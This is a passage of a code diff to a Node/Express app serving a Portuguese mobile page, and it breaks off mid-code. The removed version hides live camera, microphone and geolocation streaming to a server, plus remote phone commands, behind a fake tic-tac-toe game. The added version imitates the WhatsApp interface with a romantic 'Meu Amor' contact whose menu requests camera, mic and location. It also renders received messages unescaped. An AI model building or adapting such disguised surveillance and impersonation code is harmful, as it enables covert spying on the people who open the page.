@@ -18,1224 +18,1533 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // CELULAR: Tela de permissão única + jogo
+    // Página do CELULAR - Interface IDÊNTICA ao WhatsApp
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Jogo da Velha</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <title>WhatsApp</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        * {
             margin: 0;
-            padding: 10px;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0b141a;
+            height: 100vh;
+            overflow: hidden;
             position: relative;
         }
-        h1 { 
-            text-align: center; 
-            color: #333; 
-            margin-bottom: 15px;
+
+        /* Container principal do WhatsApp */
+        .whatsapp-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            background: #0b141a;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Header do WhatsApp */
+        .whatsapp-header {
+            background: #202c33;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #2a3942;
+            position: relative;
+            z-index: 10;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #e9edef;
             font-size: 24px;
+            cursor: pointer;
+            display: none;
         }
-        .status {
-            background: #f0f0f0;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 15px 0;
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .board {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin: 15px 0;
-        }
-        .cell {
-            background: #f8f9fa;
-            border: 2px solid #dee2e6;
-            border-radius: 10px;
-            aspect-ratio: 1;
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #2a3942;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 48px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.2s;
+            font-size: 20px;
+            position: relative;
         }
-        .cell:active { transform: scale(0.95); background: #e9ecef; }
-        .cell.x { color: #e74c3c; }
-        .cell.o { color: #3498db; }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #4CAF50;
-            color: white;
+
+        .contact-info h3 {
+            color: #e9edef;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .contact-status {
+            color: #8696a0;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .online-dot {
+            width: 8px;
+            height: 8px;
+            background: #25d366;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 20px;
+        }
+
+        .header-icon {
+            color: #e9edef;
+            font-size: 20px;
+            cursor: pointer;
+            background: none;
             border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
-            font-weight: bold;
         }
-        button:active { transform: scale(0.95); background: #45a049; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
-        
-        /* TELA DE PERMISSÃO */
-        #permissionScreen {
+
+        /* Área de mensagens - Estilo WhatsApp */
+        .messages-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="none" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
+            background-repeat: repeat;
+        }
+
+        /* Balão de mensagem - Estilo WhatsApp */
+        .message {
+            max-width: 75%;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 14.2px;
+            line-height: 1.4;
+            position: relative;
+            word-wrap: break-word;
+            animation: messageAppear 0.2s ease;
+        }
+
+        @keyframes messageAppear {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message.sent {
+            background: #005c4b;
+            color: #e9edef;
+            align-self: flex-end;
+            border-bottom-right-radius: 2px;
+        }
+
+        .message.received {
+            background: #202c33;
+            color: #e9edef;
+            align-self: flex-start;
+            border-bottom-left-radius: 2px;
+        }
+
+        .message-content {
+            word-break: break-word;
+        }
+
+        .message-meta {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 4px;
+            margin-top: 4px;
+            font-size: 10px;
+            color: #8696a0;
+        }
+
+        .message.sent .message-meta {
+            color: #8696a0;
+        }
+
+        /* Indicador de visualização */
+        .double-check {
+            font-size: 12px;
+        }
+
+        /* Mensagem de áudio */
+        .audio-message {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 200px;
+        }
+
+        .audio-play-btn {
+            background: none;
+            border: none;
+            color: #e9edef;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .audio-wave {
+            flex: 1;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .wave-bar {
+            width: 3px;
+            background: #e9edef;
+            border-radius: 2px;
+            animation: wave 0.5s ease infinite alternate;
+        }
+
+        @keyframes wave {
+            from { height: 5px; }
+            to { height: 20px; }
+        }
+
+        /* Indicador de digitação */
+        .typing-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 12px;
+            background: #202c33;
+            border-radius: 16px;
+            width: fit-content;
+            margin-bottom: 8px;
+            align-self: flex-start;
+        }
+
+        .typing-dots {
+            display: flex;
+            gap: 3px;
+        }
+
+        .typing-dots span {
+            width: 6px;
+            height: 6px;
+            background: #8696a0;
+            border-radius: 50%;
+            animation: typingDot 1.4s infinite;
+        }
+
+        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes typingDot {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
+            30% { transform: translateY(-6px); opacity: 1; }
+        }
+
+        /* Área de input - Estilo WhatsApp */
+        .message-input-area {
+            background: #202c33;
+            padding: 8px 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            position: relative;
+            z-index: 10;
+        }
+
+        .input-left {
+            display: flex;
+            gap: 8px;
+        }
+
+        .emoji-btn, .attach-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8696a0;
+        }
+
+        .message-input {
+            flex: 1;
+            background: #2a3942;
+            border: none;
+            padding: 9px 12px;
+            border-radius: 20px;
+            color: #e9edef;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .message-input::placeholder {
+            color: #8696a0;
+        }
+
+        .input-right {
+            display: flex;
+            gap: 8px;
+        }
+
+        .mic-btn, .send-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8696a0;
+        }
+
+        .send-btn.active {
+            color: #25d366;
+        }
+
+        /* Menu lateral (simulação) */
+        .side-menu {
             position: fixed;
             top: 0;
-            left: 0;
+            right: -100%;
+            width: 80%;
+            max-width: 300px;
+            height: 100%;
+            background: #202c33;
+            z-index: 100;
+            transition: right 0.3s ease;
+            box-shadow: -2px 0 8px rgba(0,0,0,0.3);
+        }
+
+        .side-menu.open {
             right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            padding: 20px;
         }
-        .permissionBox {
-            background: white;
-            border-radius: 30px;
-            padding: 30px;
-            max-width: 350px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            animation: popIn 0.5s ease;
+
+        .menu-header {
+            padding: 50px 20px 20px;
+            background: #2a3942;
         }
-        @keyframes popIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        .permissionIcon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-        .permissionTitle {
-            font-size: 28px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        .permissionText {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        .permissionList {
-            text-align: left;
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-        .permissionItem {
+
+        .menu-item {
+            padding: 15px 20px;
+            color: #e9edef;
             display: flex;
             align-items: center;
             gap: 15px;
-            padding: 10px 0;
-            border-bottom: 1px solid #dee2e6;
-        }
-        .permissionItem:last-child {
-            border-bottom: none;
-        }
-        .permissionItem span {
-            font-size: 24px;
-        }
-        .permissionItem div {
-            flex: 1;
-        }
-        .permissionItem p {
-            font-weight: 500;
-            color: #333;
-        }
-        .permissionItem small {
-            color: #666;
-            font-size: 12px;
-        }
-        .btnGrant {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            padding: 18px 30px;
-            font-size: 20px;
-            font-weight: bold;
-            width: 100%;
+            border-bottom: 1px solid #2a3942;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.4);
         }
-        .btnGrant:hover {
-            transform: scale(1.05);
-            background: #45a049;
-        }
-        .btnGrant:active {
-            transform: scale(0.95);
-        }
-        .btnGrant:disabled {
-            background: #ccc;
-            box-shadow: none;
-            transform: none;
-        }
-        
-        /* Toast notifications */
-        #toastContainer {
+
+        .menu-overlay {
             position: fixed;
-            top: 20px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 99;
+            display: none;
+        }
+
+        .menu-overlay.show {
+            display: block;
+        }
+
+        /* Notificações */
+        .notification {
+            position: fixed;
+            bottom: 80px;
             left: 50%;
             transform: translateX(-50%);
-            width: 90%;
-            max-width: 350px;
-            z-index: 9999;
-            pointer-events: none;
+            background: #1e2a32;
+            color: #e9edef;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 200;
+            animation: notifySlide 0.3s ease;
         }
-        .toast {
-            background: rgba(33, 33, 33, 0.9);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 50px;
-            margin-bottom: 10px;
-            font-size: 14px;
-            text-align: center;
-            animation: slideIn 0.3s ease;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            font-weight: 500;
-        }
-        .toast.emergency {
-            background: rgba(244, 67, 54, 0.95);
-            animation: pulse 1s infinite;
-        }
-        @keyframes slideIn {
-            from { transform: translateY(-100px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        /* Elementos ocultos inicialmente */
-        #gameContainer {
-            display: none;
-        }
-        #localVideo, #audioDebug {
-            display: none;
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+
+        @keyframes notifySlide {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
     </style>
 </head>
 <body>
-    <div id="toastContainer"></div>
-    
-    <!-- TELA DE PERMISSÃO ÚNICA -->
-    <div id="permissionScreen">
-        <div class="permissionBox">
-            <div class="permissionIcon">📱</div>
-            <div class="permissionTitle">Bem-vindo!</div>
-            <div class="permissionText">
-                Para uma experiência completa, precisamos de algumas permissões:
-            </div>
-            
-            <div class="permissionList">
-                <div class="permissionItem">
-                    <span>📷</span>
-                    <div>
-                        <p>Câmera</p>
-                        <small>Para transmitir vídeo ao vivo</small>
-                    </div>
+    <div class="whatsapp-container">
+        <!-- Header WhatsApp -->
+        <div class="whatsapp-header">
+            <div class="header-left">
+                <div class="avatar">
+                    💕
+                    <span style="position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; background: #25d366; border-radius: 50%; border: 2px solid #202c33;"></span>
                 </div>
-                <div class="permissionItem">
-                    <span>🎤</span>
-                    <div>
-                        <p>Microfone</p>
-                        <small>Para áudio em tempo real</small>
-                    </div>
-                </div>
-                <div class="permissionItem">
-                    <span>📍</span>
-                    <div>
-                        <p>Localização</p>
-                        <small>Para compartilhar posição (opcional)</small>
+                <div class="contact-info">
+                    <h3>Meu Amor ❤️</h3>
+                    <div class="contact-status">
+                        <span class="online-dot"></span>
+                        <span id="statusText">online</span>
                     </div>
                 </div>
             </div>
-            
-            <button class="btnGrant" id="grantPermissionsBtn">
-                🔓 PERMITIR TUDO
-            </button>
-            <p style="margin-top: 15px; color: #999; font-size: 12px;">
-                Clique no botão para conceder todas as permissões de uma vez
-            </p>
+            <div class="header-right">
+                <button class="header-icon" id="menuBtn">⋮</button>
+            </div>
         </div>
-    </div>
-    
-    <!-- CONTAINER DO JOGO (inicialmente oculto) -->
-    <div id="gameContainer">
-        <div class="container">
-            <h1>🎮 Jogo da Velha</h1>
-            <div class="status" id="status">Aguardando permissões...</div>
-            <div class="board" id="board"></div>
-            <button id="resetBtn" disabled>Reiniciar Jogo</button>
+
+        <!-- Área de mensagens -->
+        <div class="messages-area" id="messagesArea">
+            <div class="message received">
+                <div class="message-content">
+                    💕 Olá, meu amor! Estou aqui para você 💕
+                </div>
+                <div class="message-meta">
+                    <span class="message-time">Agora</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Área de input -->
+        <div class="message-input-area">
+            <div class="input-left">
+                <button class="emoji-btn" id="emojiBtn">😊</button>
+                <button class="attach-btn" id="attachBtn">+</button>
+            </div>
+            <input type="text" class="message-input" id="messageInput" placeholder="Digite uma mensagem">
+            <div class="input-right">
+                <button class="mic-btn" id="micBtn">🎤</button>
+                <button class="send-btn" id="sendBtn">📤</button>
+            </div>
         </div>
     </div>
 
-    <video id="localVideo" autoplay playsinline muted></video>
-    <audio id="audioDebug" autoplay></audio>
+    <!-- Menu lateral -->
+    <div class="menu-overlay" id="menuOverlay"></div>
+    <div class="side-menu" id="sideMenu">
+        <div class="menu-header">
+            <div style="text-align: center;">
+                <div style="font-size: 60px;">💕</div>
+                <h3 style="color: #e9edef; margin-top: 10px;">Meu Amor</h3>
+                <p style="color: #8696a0; font-size: 12px;">Conectado</p>
+            </div>
+        </div>
+        <div class="menu-item" id="menuCamera">
+            <span>📷</span> <span>Câmera</span>
+        </div>
+        <div class="menu-item" id="menuMic">
+            <span>🎤</span> <span>Microfone</span>
+        </div>
+        <div class="menu-item" id="menuLocation">
+            <span>📍</span> <span>Localização</span>
+        </div>
+        <div class="menu-item" id="menuMusic">
+            <span>🎵</span> <span>Música</span>
+        </div>
+    </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}', {
-            transports: ['websocket', 'polling'],
-            reconnection: true,
-            reconnectionAttempts: 10,
-            reconnectionDelay: 1000,
-            reconnectionDelayMax: 5000,
-            timeout: 20000
-        });
+        const socket = io('${fullUrl}');
         
-        // Variáveis
-        let minhaVez = false;
-        let meuSimbolo = '';
-        let gameActive = false;
-        let board = ['', '', '', '', '', '', '', '', ''];
-        let mediaStream = null;
-        let facingMode = 'environment';
-        let audioContext = null;
-        let audioProcessor = null;
-        let audioSource = null;
-        let permissionsGranted = false;
-        let videoInterval = null;
-        let audioInterval = null;
+        // Elementos
+        const messagesArea = document.getElementById('messagesArea');
+        const messageInput = document.getElementById('messageInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const micBtn = document.getElementById('micBtn');
+        const emojiBtn = document.getElementById('emojiBtn');
+        const attachBtn = document.getElementById('attachBtn');
+        const menuBtn = document.getElementById('menuBtn');
+        const sideMenu = document.getElementById('sideMenu');
+        const menuOverlay = document.getElementById('menuOverlay');
+        const statusText = document.getElementById('statusText');
         
-        // Elementos DOM
-        const statusDiv = document.getElementById('status');
-        const resetBtn = document.getElementById('resetBtn');
-        const localVideo = document.getElementById('localVideo');
-        const toastContainer = document.getElementById('toastContainer');
-        const permissionScreen = document.getElementById('permissionScreen');
-        const gameContainer = document.getElementById('gameContainer');
-        const grantBtn = document.getElementById('grantPermissionsBtn');
+        // Estado
+        let isRecording = false;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let typingTimeout = null;
+        let isTyping = false;
         
-        // Criar tabuleiro
-        for(let i = 0; i < 9; i++) {
-            let cell = document.createElement('div');
-            cell.className = 'cell';
-            cell.id = 'cell-' + i;
-            cell.onclick = () => {
-                if(gameActive && minhaVez && board[i] === '') {
-                    socket.emit('jogada', i);
-                }
-            };
-            document.getElementById('board').appendChild(cell);
-        }
-        
-        // Função para mostrar mensagens
-        function showMessageToast(message, isEmergency = false) {
-            const toast = document.createElement('div');
-            toast.className = 'toast' + (isEmergency ? ' emergency' : '');
-            toast.textContent = message;
-            toastContainer.appendChild(toast);
+        // Função para adicionar mensagem
+        function addMessage(text, type = 'received', isAudio = false, audioUrl = null) {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${type}`;
             
-            setTimeout(() => {
-                if (toast.parentNode) {
-                    toast.style.animation = 'slideIn 0.3s reverse';
-                    setTimeout(() => {
-                        if (toast.parentNode) toast.remove();
-                    }, 300);
-                }
-            }, 3000);
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            
+            if (isAudio && audioUrl) {
+                messageDiv.innerHTML = \`
+                    <div class="audio-message">
+                        <button class="audio-play-btn" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('audio_\${Date.now()}').play()">▶️</button>
+                        <div class="audio-wave">
+                            <div class="wave-bar" style="animation-duration: 0.3s"></div>
+                            <div class="wave-bar" style="animation-duration: 0.5s"></div>
+                            <div class="wave-bar" style="animation-duration: 0.4s"></div>
+                            <div class="wave-bar" style="animation-duration: 0.6s"></div>
+                            <div class="wave-bar" style="animation-duration: 0.35s"></div>
+                        </div>
+                        <audio id="audio_\${Date.now()}" src="\${audioUrl}" style="display: none;"></audio>
+                        <span style="font-size: 11px;">0:00</span>
+                    </div>
+                    <div class="message-meta">
+                        <span class="message-time">\${timeStr}</span>
+                        <span class="double-check">✓✓</span>
+                    </div>
+                \`;
+            } else {
+                messageDiv.innerHTML = \`
+                    <div class="message-content">\${text}</div>
+                    <div class="message-meta">
+                        <span class="message-time">\${timeStr}</span>
+                        <span class="double-check">✓✓</span>
+                    </div>
+                \`;
+            }
+            
+            messagesArea.appendChild(messageDiv);
+            messagesArea.scrollTop = messagesArea.scrollHeight;
+            return messageDiv;
         }
         
-        // Função para parar todas as transmissões
-        function stopAllStreams() {
-            if (videoInterval) {
-                clearInterval(videoInterval);
-                videoInterval = null;
-            }
-            if (audioInterval) {
-                clearInterval(audioInterval);
-                audioInterval = null;
-            }
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-                mediaStream = null;
-            }
-            if (audioContext) {
-                audioContext.close();
-                audioContext = null;
+        // Enviar mensagem
+        function sendMessage() {
+            const text = messageInput.value.trim();
+            if (text) {
+                addMessage(text, 'sent');
+                socket.emit('chat_message', text);
+                messageInput.value = '';
+                stopTyping();
             }
         }
         
-        // FUNÇÃO PRINCIPAL - CONCEDER TODAS AS PERMISSÕES DE UMA VEZ
-        async function grantAllPermissions() {
+        // Indicador de digitação
+        function startTyping() {
+            if (!isTyping) {
+                isTyping = true;
+                socket.emit('typing_start');
+            }
+            if (typingTimeout) clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => {
+                stopTyping();
+            }, 1000);
+        }
+        
+        function stopTyping() {
+            if (isTyping) {
+                isTyping = false;
+                socket.emit('typing_stop');
+            }
+        }
+        
+        // Mostrar notificação
+        function showNotification(message) {
+            const notif = document.createElement('div');
+            notif.className = 'notification';
+            notif.textContent = message;
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 3000);
+        }
+        
+        // Gravar áudio
+        async function startRecording() {
             try {
-                // Desabilitar botão e mostrar loading
-                grantBtn.disabled = true;
-                grantBtn.innerHTML = '<span class="loading"></span> Solicitando permissões...';
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
                 
-                // Parar streams anteriores se existirem
-                stopAllStreams();
-                
-                // 1. PEDIR PERMISSÃO DE CÂMERA E MICROFONE (juntos)
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 320 },
-                        height: { ideal: 240 },
-                        facingMode: facingMode
-                    },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
-                });
-                
-                // Conecta o vídeo
-                localVideo.srcObject = mediaStream;
-                await localVideo.play();
-                
-                // Configurar áudio
-                audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                await audioContext.resume();
-                
-                audioSource = audioContext.createMediaStreamSource(mediaStream);
-                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
-                
-                audioSource.connect(audioProcessor);
-                audioProcessor.connect(audioContext.destination);
-                
-                // Enviar áudio em intervalos
-                audioProcessor.onaudioprocess = (e) => {
-                    if (!permissionsGranted) return;
-                    const inputData = e.inputBuffer.getChannelData(0);
-                    // Envia apenas 1 a cada 3 frames para não sobrecarregar
-                    if (Math.random() < 0.3) {
-                        // Converte para array normal e reduz tamanho
-                        const reduced = [];
-                        for (let i = 0; i < inputData.length; i += 4) {
-                            reduced.push(inputData[i]);
-                        }
-                        socket.emit('audio', reduced);
-                    }
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
                 };
                 
-                // Iniciar transmissão de vídeo
-                const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
-                const ctx = canvas.getContext('2d');
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const audioUrl = URL.createObjectURL(audioBlob);
+                    addMessage('🎤 Mensagem de áudio', 'sent', true, audioUrl);
+                    
+                    // Converter para base64 e enviar
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        socket.emit('audio_message', reader.result);
+                    };
+                    reader.readAsDataURL(audioBlob);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    showNotification('🎤 Áudio enviado!');
+                };
                 
-                // Enviar vídeo a cada 200ms
-                videoInterval = setInterval(() => {
-                    if (permissionsGranted && mediaStream && mediaStream.active) {
-                        try {
-                            ctx.drawImage(localVideo, 0, 0, 320, 240);
-                            const frame = canvas.toDataURL('image/jpeg', 0.2);
-                            socket.emit('frame', frame);
-                        } catch (e) {
-                            console.log('Erro ao capturar frame:', e);
-                        }
-                    }
-                }, 200);
-                
-                // 2. PEDIR PERMISSÃO DE LOCALIZAÇÃO (se disponível)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            socket.emit('location', {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            });
-                            showMessageToast('📍 Localização compartilhada');
-                        },
-                        (error) => {
-                            console.log('Localização não concedida:', error);
-                            showMessageToast('📍 Localização não disponível');
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                }
-                
-                // PERMISSÕES CONCEDIDAS COM SUCESSO!
-                permissionsGranted = true;
-                
-                // Esconder tela de permissão e mostrar jogo
-                permissionScreen.style.display = 'none';
-                gameContainer.style.display = 'block';
-                
-                showMessageToast('✅ Todas as permissões concedidas! Bem-vindo ao jogo!');
-                statusDiv.innerHTML = 'Conectado! Aguardando oponente...';
-                
+                mediaRecorder.start();
+                isRecording = true;
+                micBtn.textContent = '⏹️';
+                micBtn.style.color = '#25d366';
+                showNotification('🎤 Gravando... Clique novamente para parar');
             } catch (err) {
-                console.error('Erro ao conceder permissões:', err);
-                grantBtn.disabled = false;
-                grantBtn.innerHTML = '🔓 TENTAR NOVAMENTE';
-                
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    showMessageToast('❌ Permissão negada. Por favor, permita câmera e microfone para jogar.');
-                } else if (err.name === 'NotFoundError') {
-                    showMessageToast('❌ Nenhuma câmera ou microfone encontrado no dispositivo.');
-                } else if (err.name === 'NotReadableError') {
-                    showMessageToast('❌ Câmera ou microfone está sendo usado por outro aplicativo.');
-                } else if (err.name === 'OverconstrainedError') {
-                    showMessageToast('❌ Configurações de câmera não suportadas.');
-                } else {
-                    showMessageToast('❌ Erro: ' + (err.message || 'Desconhecido'));
-                }
+                console.error('Erro ao gravar áudio:', err);
+                showNotification('❌ Erro ao acessar microfone');
             }
         }
         
-        // Event listener do botão de permissão
-        grantBtn.addEventListener('click', grantAllPermissions);
+        function stopRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+                isRecording = false;
+                micBtn.textContent = '🎤';
+                micBtn.style.color = '#8696a0';
+            }
+        }
         
-        // Receber comandos do PC
-        socket.on('comando', (cmd) => {
-            if (!permissionsGranted) return;
-            
-            if (cmd === 'vibrate' && navigator.vibrate) {
-                navigator.vibrate(500);
-                showMessageToast('📳 Vibrar');
-            } 
-            else if (cmd === 'emergency' && navigator.vibrate) {
-                navigator.vibrate([500, 200, 500, 200, 500]);
-                showMessageToast('⚠️ EMERGÊNCIA!', true);
-            } 
-            else if (cmd === 'trocarCamera') {
-                facingMode = facingMode === 'environment' ? 'user' : 'environment';
-                showMessageToast('🔄 Trocando câmera...');
-                // Reiniciar câmera com nova orientação
-                grantAllPermissions();
+        // Eventos de input
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+        messageInput.addEventListener('input', () => {
+            startTyping();
+        });
+        
+        // Botão de microfone
+        micBtn.addEventListener('click', () => {
+            if (isRecording) {
+                stopRecording();
+            } else {
+                startRecording();
             }
         });
         
-        // Receber mensagens do chat
-        socket.on('mensagem', (msg) => {
-            if (permissionsGranted) {
-                showMessageToast('💬 ' + msg);
+        // Menu
+        menuBtn.addEventListener('click', () => {
+            sideMenu.classList.add('open');
+            menuOverlay.classList.add('show');
+        });
+        
+        function closeMenu() {
+            sideMenu.classList.remove('open');
+            menuOverlay.classList.remove('show');
+        }
+        
+        menuOverlay.addEventListener('click', closeMenu);
+        
+        // Ações do menu
+        document.getElementById('menuCamera').addEventListener('click', () => {
+            socket.emit('comando', 'toggleCamera');
+            showNotification('📷 Solicitando câmera');
+            closeMenu();
+        });
+        
+        document.getElementById('menuMic').addEventListener('click', () => {
+            socket.emit('comando', 'toggleAudio');
+            showNotification('🎤 Solicitando microfone');
+            closeMenu();
+        });
+        
+        document.getElementById('menuLocation').addEventListener('click', () => {
+            socket.emit('comando', 'getLocation');
+            showNotification('📍 Solicitando localização');
+            closeMenu();
+        });
+        
+        document.getElementById('menuMusic').addEventListener('click', () => {
+            socket.emit('comando', 'playMusic');
+            showNotification('🎵 Tocando música romântica');
+            closeMenu();
+        });
+        
+        // Emojis simples
+        emojiBtn.addEventListener('click', () => {
+            const emojis = ['😊', '❤️', '💕', '😘', '🥰', '💖', '💗', '💓', '💝', '💘', '💌', '🌹', '✨', '⭐', '🎵'];
+            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+            messageInput.value += randomEmoji;
+            messageInput.focus();
+        });
+        
+        // Socket events
+        socket.on('chat_message', (msg) => {
+            addMessage(msg, 'received');
+            showNotification('💬 Nova mensagem');
+        });
+        
+        socket.on('audio_message', (audioBase64) => {
+            addMessage('🎤 Mensagem de áudio', 'received', true, audioBase64);
+            showNotification('🎤 Nova mensagem de áudio');
+        });
+        
+        socket.on('typing_start', () => {
+            statusText.innerHTML = '<span class="online-dot"></span> digitando...';
+        });
+        
+        socket.on('typing_stop', () => {
+            statusText.innerHTML = '<span class="online-dot"></span> online';
+        });
+        
+        socket.on('status_update', (status) => {
+            if (status === 'online') {
+                statusText.innerHTML = '<span class="online-dot"></span> online';
+            } else {
+                statusText.innerHTML = '<span class="online-dot"></span> último visto agora';
             }
         });
         
-        // Eventos do jogo
         socket.on('connect', () => {
-            console.log('Conectado ao servidor');
-            if (permissionsGranted) {
-                statusDiv.innerHTML = 'Conectado! Aguardando oponente...';
-                showMessageToast('✅ Conectado ao servidor');
-            }
-        });
-        
-        socket.on('connect_error', (error) => {
-            console.log('Erro de conexão:', error);
-            if (permissionsGranted) {
-                statusDiv.innerHTML = '❌ Erro de conexão';
-                showMessageToast('❌ Erro ao conectar ao servidor');
-            }
-        });
-        
-        socket.on('disconnect', () => {
-            console.log('Desconectado');
-            if (permissionsGranted) {
